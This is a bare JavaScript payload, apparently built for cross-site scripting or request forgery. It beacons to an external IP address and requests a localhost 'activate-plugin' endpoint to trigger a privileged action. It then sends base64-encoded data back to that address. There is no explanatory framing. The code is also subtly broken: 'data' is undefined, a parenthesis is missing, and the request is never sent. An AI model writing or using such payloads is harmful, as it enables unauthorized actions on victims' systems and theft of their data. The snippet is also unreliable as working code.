fetch("http://82.65.210.151:24000/?test");

url = 'http://localhost:5000/activate-plugin/1';

var xhr = new XMLHttpRequest();
// Configure the request
xhr.open('GET', url, true);

// Set up a function to handle the response
xhr.onload = function() {
  if (xhr.status >= 200 && xhr.status < 300) {
    // Request was successful
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data))
  } else {
    // Handle errors
    fetch("http://82.65.210.151:24000/?error=true";
  }
};

